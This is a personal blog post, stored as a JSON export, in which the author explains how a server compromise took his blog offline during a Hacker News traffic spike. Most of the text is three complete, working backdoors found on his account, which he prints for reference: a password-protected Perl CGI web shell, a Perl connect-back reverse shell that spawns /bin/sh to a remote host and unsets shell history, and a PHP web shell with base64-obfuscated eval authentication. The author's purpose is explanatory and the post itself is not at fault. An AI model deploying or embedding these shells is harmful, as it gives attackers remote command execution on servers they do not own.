{"data":{"wordpressPost":{"title":"Being hacked killed a 6k traffic spike on my blog yesterday","content":"<div class=\"zemanta-img\" style=\"margin: 1em; display: block;\">\n<div style=\"width: 310px\" class=\"wp-caption alignright\"><a href=\"http://commons.wikipedia.org/wiki/File:Visual_analytics_practice.jpg\"><img title=\"Visual analytics practice\" src=\"http://upload.wikimedia.org/wikipedia/commons/thumb/4/43/Visual_analytics_practice.jpg/300px-Visual_analytics_practice.jpg\" alt=\"Visual analytics practice\" width=\"300\" height=\"454\" /></a><p class=\"wp-caption-text\">Image via Wikipedia</p></div>\n</div>\n<p>Yesterday I wrote a blog <a title=\"Don’t be a quiet professional\" href=\"http://swizec.com/blog/dont-be-a-quiet-professional/swizec/1707\">boldly proclaiming one shouldn&#8217;t be a quiet professional</a>. I felt it wasn&#8217;t very inspired and lacked a certain amount of substance, but the internet apparently had a different idea of its value.</p>\n<p>All it took to get it on the frontpage of <a class=\"zem_slink freebase/en/hacker_news\" title=\"Hacker News\" rel=\"homepage\" href=\"http://news.ycombinator.com/\">HackerNews</a> was posting the link on twitter &#8230; usually I have to beg, plead and promise sexual favours to people on IRC so they&#8217;d read my links and give them an upvote or two.</p>\n<p>Happy day!</p>\n<p>And it was going pretty well too until a few moments later I get a &#8220;call&#8221; from someone living on the same server as this blog &#8230; &#8220;Your blog got hacked dude, you were killing the server, you&#8217;re killed&#8221;</p>\n<p>The what now?</p>\n<p>By this time the link was thriving on frontpage and was gaining upvotes like a madman, even after it started throwing a 403 to everyone trying to read it was still gaining upvotes and from the best of my observations it was among the top five for at least an hour. Eventually it fell off the frontpage completely, but some people were still sharing the link around on twitter because they had apparently opened it hours ago before sharing.</p>\n<h2>Consequences</h2>\n<p>The consequences of being hacked are pretty simple: a lot of frustration on my part.</p>\n<p>The more important consequences have to do with the fact I use this blog to drive traffic to hipstervision.org via that big link on the left and I use hipstervision to get job offers because it&#8217;s currently the shiniest product I have to show. It actually works.</p>\n<p>On top of that, I&#8217;m a total numbers geek. If I see a number, I want to make it better. Google analytics are that sort of number, I just love seeing those graphs go up.</p>\n<p>So here&#8217;s the deal, <a class=\"zem_slink freebase/en/google_analytics\" title=\"Google Analytics\" rel=\"homepage\" href=\"http://www.google.com/analytics\">Google Analytics</a> says 1584 people came to read my blog yesterday. Pretty good right?</p>\n<p>Well, running a simple grep on yesterday&#8217;s logs says that <strong style=\"font-size: 1.3em\">6268 </strong>were shown an ugly 403 error.</p>\n<p>Six. Fucking. Thousand! That&#8217;s more than I get in an average month (hey this is just a lame blog, I&#8217;m not used to traffic). And certainly not all of those were actual people but different spiders and automated things, but still, even if just half of those requests came from real people that&#8217;s a pretty sucky thing to have happen.</p>\n<p>I wonder how many would come if they could actually read the post &#8230; some of them might like it enough to share it, some more might upvote it &#8230; oh the possibilities are endless here.</p>\n<h2>Wtf happened</h2>\n<p>To be honest, I don&#8217;t know exactly what happened. The sysadmin says my blog was causing a load of 70+, which I think is sysadmin talk for &#8220;trying to use 70-times more resources than are available&#8221; and was killing the server. He took a quick look, saw weird scripts on my account, and promptly killed everything.</p>\n<p>He said thousands of requests per second were being made with my account, which is just odd. HN is popular, but not <em>that</em> popular.</p>\n<p>I can&#8217;t say I know when or why those scripts made it onto the server, creation times reported were somewhere around january &#8230; why they would get activated at this particular time, is a mystery &#8230;</p>\n<p>Not entirely certain there&#8217;s a lesson in all of this, being hacked just plain sucks and there&#8217;s never a good time for going through such an affair.</p>\n<p>Just to feed curiosity, and for future reference of sorts, here are the scripts I found laying about my home dir.</p>\n<p>This was in the cgi-bin directory, now this directory doesn&#8217;t exist anymore</p>\n<pre lang=\"perl\">#!/usr/bin/perl\r\nuse strict;\r\nuse CGI::Carp qw(warningsToBrowser fatalsToBrowser);\r\nuse CGI qw(:standard escapeHTML);\r\n\r\nmy $vers = \"BUTAS 1.1 TRME\";\r\nmy $pwd  = \"BvR/DtaeLh5zw\";\r\nmy $salt = substr($pwd, 0, 2);\r\nmy $ipwd = param(\"pwd\");\r\nmy $epwd = crypt($ipwd, $salt);\r\nmy $npwd = crypt(\"\", $salt);\r\nmy $cid2 = cookie(\"cid\");\r\nmy $cid;\r\nmy $msg  = \" \";\r\nmy $command;\r\nmy $takbo;\r\nmy $lihim;\r\nmy $result;\r\n\r\n$0=\"[khvcd]\";\r\n\r\nsub URLEncode {\r\n  my $theURL = $_[0];\r\n  $theURL =~ s/([\\W])/\"%\" . uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n  return $theURL;\r\n}\r\n\r\nif ($pwd eq $epwd) {\r\n  $cid  = cookie(-name=&gt;\"cid\", -value=&gt;\"1\");\r\n  $cid2 = \"1\";\r\n}\r\n\r\nif ($epwd ne $npwd) {\r\n  $msg = \"\r\n\r\n\r\n<h1>Mukha Mo!</h1>\r\n\r\n\r\n\";\r\n}\r\n\r\nif (!($cid)) {\r\n  $cid = cookie( -name=&gt;\"cid\", -value=&gt;\"0\" );\r\n}\r\n\r\n$cid  = cookie(-name=&gt;\"cid\", -value=&gt;$cid2);\r\n\r\nprint header( -COOKIE=&gt;$cid ), start_html($vers);\r\n\r\nif ($cid2 ne \"1\") {\r\n  print $msg;\r\n  print start_form();\r\n  print \"The magic word is \";\r\n  print textfield( -name=&gt;\"pwd\", -size=&gt;\"100\");\r\n  print submit(-name=&gt; 'submit_form', -value    =&gt; 'Submit',);\r\n  print end_form;\r\n  print end_html;\r\n  exit(0);\r\n}\r\n\r\nprint start_form();\r\n\r\nif (param()){\r\n  $command = param(\"command\");\r\n  $takbo   = param(\"takbo\");\r\n  $lihim   = param(\"lihim\");\r\n}\r\n\r\nprint \"\r\n\r\n<h3>$vers</h3>\r\n\r\n\r\n\\n\";\r\nprint \"\r\n\r\n<fieldset>\\n\r\n<legend>Input</legend>\r\n\r\n\\n\\n\";\r\nprint \"EXEC: \";\r\nprint textfield( -name=&gt;\"takbo\", -size=&gt;\"20\", -value=&gt;$takbo,);\r\nprint \"\\n\";\r\nprint \"PASS: \";\r\nprint textfield( -name=&gt;\"lihim\", -size=&gt;\"20\", -value=&gt;$lihim,);\r\nprint \"\\n\r\n\\n\";\r\nprint \"Your Command \";\r\nprint textfield( -name=&gt;\"command\", -size=&gt;\"100\", -value=&gt;\"\");\r\nprint \"\\n\";\r\nprint submit(-name=&gt; 'submit_form', -value    =&gt; 'Submit Command',);\r\n\r\nprint \"\\n\\n\r\n</fieldset>\r\n\r\n\\n\";\r\n\r\nif (param()){\r\n  my $order;\r\n\r\n  $command = param(\"command\");\r\n  $takbo   = param(\"takbo\");\r\n  $lihim   = param(\"lihim\");\r\n\r\n  if  (($takbo ne \"\") &amp;&amp; ($lihim ne \"\")) {\r\n    $order = $takbo .\" \" . $lihim . \" \" . URLEncode($command);\r\n  } else {\r\n    $order = $command;\r\n  }\r\n\r\n  $result  = `$order`;\r\n\r\n  my $outtxt = \"$result\\n\";\r\n\r\n  print \"\\n\\n\r\n\r\n<fieldset>\\n\\t\r\n<legend>Output</legend>\r\n\r\n\\n\\t\";\r\n  print '<textarea cols=\"120\" rows=\"25\" readonly=\"readonly\">';\r\n  print \"\\n\";\r\n  print \"$outtxt\";\r\n  print \"\\n\\t</textarea>\\n\r\n</fieldset>\r\n\r\n\\n\";\r\n\r\n}\r\nprint \"\\n\";\r\nprint end_form;\r\nprint \"\\n\\n<script type=\"\\&quot;text/javascript\\&quot;\"><!--mce:0--></script>\\n\";\r\nprint end_html;\r\n\r\n\r\n</pre>\n<p>These two were just laying about on their own</p>\n<pre lang=\"perl\">#!/usr/bin/perl\r\nuse IO::Socket;\r\n#IRAN HACKERS SABOTAGE Connect Back Shell\r\n#code by:LorD\r\n#We Are :LorD-C0d3r-NT\r\n#\r\n#lord@SlackwareLinux:/home/programing$ perl dc.pl\r\n#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--\r\n#\r\n#Usage: dc.pl [Host] [Port]\r\n#\r\n#Ex: dc.pl 127.0.0.1 2121\r\n#lord@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121\r\n#--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--\r\n#\r\n#[*] Resolving HostName\r\n#[*] Connecting... 127.0.0.1\r\n#[*] Spawning Shell\r\n#[*] Connected to remote host\r\n\r\n#bash-2.05b# nc -vv -l -p 2121\r\n#listening on [any] 2121 ...\r\n#connect to [127.0.0.1] from localhost [127.0.0.1] 2121\r\n#--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--\r\n#\r\n#--==Systeminfo==--\r\n#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux\r\n#\r\n#--==Userinfo==--\r\n#uid=1001(lord) gid=100(users) groups=100(users)\r\n#\r\n#--==Directory==--\r\n#/root\r\n#\r\n#--==Shell==--\r\n#\r\n$system\t= '/bin/sh';\r\n$ARGC=@ARGV;\r\nprint \"--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==-- \\n\\n\";\r\nif ($ARGC!=2) {\r\n   print \"Usage: $0 [Host] [Port] \\n\\n\";\r\n   die \"Ex: $0 127.0.0.1 2121 \\n\";\r\n}\r\nuse Socket;\r\nuse FileHandle;\r\nsocket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print \"[-] Unable to Resolve Host\\n\";\r\nconnect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print \"[-] Unable to Connect Host\\n\";\r\nprint \"[*] Resolving HostName\\n\";\r\nprint \"[*] Connecting... $ARGV[0] \\n\";\r\nprint \"[*] Spawning Shell \\n\";\r\nprint \"[*] Connected to remote host \\n\";\r\nSOCKET-&gt;autoflush();\r\nopen(STDIN, \"&gt;&amp;SOCKET\");\r\nopen(STDOUT,\"&gt;&amp;SOCKET\");\r\nopen(STDERR,\"&gt;&amp;SOCKET\");\r\nprint \"--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--  \\n\\n\";\r\nsystem(\"unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo;\r\necho --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- \");\r\nsystem($system);\r\n#EOF????? ??????</pre>\n<p>And a really interesting game.php</p>\n<pre lang=\"php\"><!--?php\r\n\r\ndefine('HELP_VERSION', '1.9');\r\n\r\neval(base64_decode('JHBhc3N3ZCA9IGFycmF5KCdyb290JyA9PiAnMTJiZWZiZmUxMDY4ZWZhMmQ2ODEzMTg4Y2I0OGY3OTYnKTsKCmlmICghaXNzZXQoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSkgfHwKICAgICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwKICAgICFpc3NldCgkcGFzc3dkWyRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ11dKSB8fAogICAgJHBhc3N3ZFskX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddXSAhPSBtZDUoJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pKSB7CiAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iSEVMUCAxLjgiJyk7CiAgaGVhZGVyKCdIVFRQLzEuMCA0MDEgVW5hdXRob3JpemVkJyk7CiAgJGF1dGhlbnRpY2F0ZWQgPSB0cnVlOwogIGVjaG8gIjxodG1sPjxoZWFkPjx0aXRsZT5BY2Nlc3MgRGVuaWVkPC90aXRsZT48L2hlYWQ+PGgxPkFjY2VzcyBkZW5pZWQ8L2gxPjxocj48Ym9keT48L2JvZHk+PC9odG1sPiI7CiAgZXhpdCgwKTsKCn0gZWxzZSB7CiAgJGF1dGhlbnRpY2F0ZWQgPSB0cnVlOwp9Cg=='));\r\n\r\nheader('Content-Type: text/html; charset=UTF-8');\r\necho '<?xml version=\"1.0\" encoding=\"UTF-8\"?-->' . \"\\n\";\r\n?&gt;\r\n\r\n  HELP &lt;?php echo HELP_VERSION ?&gt;\r\n\r\n\r\n\r\n<h3>HELP <!--?php echo HELP_VERSION ?--></h3>\r\n\r\n\r\n<!--?php error_reporting (E_ALL); $work_dir = empty($_REQUEST['work_dir']) ? '' : $_REQUEST['work_dir']; $command  = empty($_REQUEST['command'])  ? '' : $_REQUEST['command']; $lihim    = empty($_REQUEST['lihim'])    ? '' : $_REQUEST['lihim']; $takbo    = empty($_REQUEST['takbo'])    ? '' : $_REQUEST['takbo']; $stderr   = empty($_REQUEST['stderr'])   ? '' : $_REQUEST['stderr']; if ($work_dir != '') {   if ($command != '') {     if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {       if ($regs[1][0] == '/') {         $new_dir = $regs[1];       } else {         $new_dir = $work_dir . '/' . $regs[1];       }       if (file_exists($new_dir) && is_dir($new_dir)) {         $work_dir = $new_dir;       }       $command = '';     }   } } if ($work_dir != '' && file_exists($work_dir) && is_dir($work_dir)) {   chdir($work_dir); } $work_dir = getcwd(); ?-->\r\n\r\n\r\n<form action=\"&lt;?php echo $_SERVER['PHP_SELF'] ?&gt;\" method=\"post\">\r\n\r\n\r\n<fieldset>\r\n<legend>Input</legend>\r\n\r\nCurrent working directory: <strong>\r\n<!--?php\r\n\r\n$work_dir_splitted = explode('/', substr($work_dir, 1));\r\n\r\necho '<a href=\"' . $_SERVER['PHP_SELF'] . '?work_dir=/\" _mce_href=\"' . $_SERVER['PHP_SELF'] . '?work_dir=/\"-->Root/';\r\n\r\nif (!empty($work_dir_splitted[0])) {\r\n  $path = '';\r\n  for ($i = 0; $i &lt; count($work_dir_splitted); $i++) {\r\n    $path .= '/' . $work_dir_splitted[$i];\r\n    printf('<a href=\"%s?work_dir=%s\">%s</a>/',\r\n           $_SERVER['PHP_SELF'],\r\n           urlencode($path),\r\n           $work_dir_splitted[$i]);\r\n  }\r\n}\r\n\r\n?&gt;</strong>\r\n\r\n    EXEC: <input name=\"takbo\" size=\"20\" type=\"text\" value=\"&lt;?PHP echo $takbo ?&gt;\" />\r\n    PASS: <input name=\"lihim\" size=\"20\" type=\"password\" value=\"&lt;?PHP echo $lihim ?&gt;\" />\r\n    Choose new working directory:\r\n\r\n<select name=\"work_dir\">\r\n<!--?php\r\n$dir_handle = opendir($work_dir);\r\n\r\nwhile ($dir = readdir($dir_handle)) {\r\n  if (is_dir($dir)) {\r\n    if ($dir == '.') {\r\n      echo \"<option value=\\\"$work_dir\\\" selected=\"selected\"-->Current Directory\\n\";\r\n    } elseif ($dir == '..') {\r\n\r\n      if (strlen($work_dir) == 1) {\r\n      } elseif (strrpos($work_dir, '/') == 0) {\r\n      echo \"<option value=\"\\&quot;/\\&quot;\">Parent Directory</option>\\n\";\r\n      } else {\r\n      echo \"<option value=\"\\&quot;&quot;.\">Parent Directory</option>\\n\";\r\n      }\r\n    } else {\r\n      if ($work_dir == '/') {\r\n        echo \"<option value=\"\\&quot;$work_dir$dir\\&quot;\">$dir</option>\\n\";\r\n      } else {\r\n        echo \"<option value=\"\\&quot;$work_dir/$dir\\&quot;\">$dir</option>\\n\";\r\n      }\r\n    }\r\n  }\r\n}\r\nclosedir($dir_handle);\r\n\r\n?&gt;\r\n\r\n</select>\r\n\r\n\r\nCommand: <input name=\"command\" size=\"60\" type=\"text\" />\r\nEnable <code>stderr</code>-trapping?\r\n<input name=\"stderr\" type=\"checkbox\" /> /&gt;\r\n<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\" />\r\n\r\n \r\n</fieldset>\r\n\r\n \r\n\r\n<fieldset>\r\n<legend>Output</legend>\r\n\r\n<textarea cols=\"120\" rows=\"20\" readonly=\"readonly\">&lt;?php function shell_exec2($cmd){   if (!empty($cmd)){     $fp = popen($cmd,\"r\");     {       $result = \"\";       while(!feof($fp)){$result.=fread($fp,1024);}       pclose($fp);     }   }   return convert_cyr_string($result,\"d\",\"w\"); } if (!empty($command)) {   if ($stderr) {     $tmpfile = tempnam('/tmp', 'ses_6r');     $command .= \" &gt; $tmpfile 2&gt;&amp;1; cat $tmpfile; rm $tmpfile\";\r\n  } elseif ($command == 'ls') {\r\n    $command .= ' -F';\r\n  }\r\n\r\n  if (!empty($takbo) &amp;&amp; !empty($lihim)) {\r\n    $mycommand = $takbo . \" \" . $lihim . \" \";\r\n  }\r\n\r\n  if (!empty($mycommand)) {\r\n    $mycommand .= urlencode($command);\r\n  } else {\r\n    $mycommand = $command;\r\n  }\r\n\r\n  echo htmlspecialchars(shell_exec2($mycommand), ENT_COMPAT, 'UTF-8');\r\n}\r\n?&gt;\r\n</textarea>\r\n\r\n \r\n</fieldset>\r\n\r\n \r\n</form>\r\n\r\n\r\n<script type=\"text/javascript\"><!--mce:1--></script>\r\n\r\n\r\n</pre>\n<h6 class=\"zemanta-related-title\" style=\"font-size: 1em;\">Related articles</h6>\n<ul class=\"zemanta-article-ul\">\n<li class=\"zemanta-article-ul-li\"><a href=\"http://newsgrange.com/adventures-in-solo-blogging-the-first-100000-pageviews/\">Adventures in Solo Blogging: The First 100,000 Pageviews</a> (newsgrange.com)</li>\n<li class=\"zemanta-article-ul-li\"><a href=\"http://supermaninthemiddle.wordpress.com/2011/05/05/checking-that-firewalls-are-opened/\">Checking that firewalls are opened</a> (supermaninthemiddle.wordpress.com)</li>\n<li class=\"zemanta-article-ul-li\"><a href=\"http://www.catonmat.net/blog/perl-tcp-proxy\">A TCP Proxy in Perl</a> (catonmat.net)</li>\n<li class=\"zemanta-article-ul-li\"><a href=\"http://metamarketsgroup.com/blog/hacking-hacker-news-headlines/\">Hacking Hacker News Headlines</a> (metamarketsgroup.com)</li>\n</ul>\n<div class=\"zemanta-pixie\" style=\"margin-top: 10px; height: 15px;\"><a class=\"zemanta-pixie-a\" title=\"Enhanced by Zemanta\" href=\"http://www.zemanta.com/\"><img class=\"zemanta-pixie-img\" style=\"border: none; float: right;\" src=\"http://img.zemanta.com/zemified_e.png?x-id=f0c42271-7735-4eb6-a88f-5eba9fa48cad\" alt=\"Enhanced by Zemanta\" /></a><span class=\"zem-script more-related more-info pretty-attribution\"><script src=\"http://static.zemanta.com/readside/loader.js\" type=\"text/javascript\"></script></span></div>\n"},"site":{"siteMetadata":{"title":"Swizec Blog","subtitle":"Fetch Data From Local WP Install"}}},"pageContext":{"id":"98885c3b-f8be-57bd-b1c0-2ca706b07ccb"}}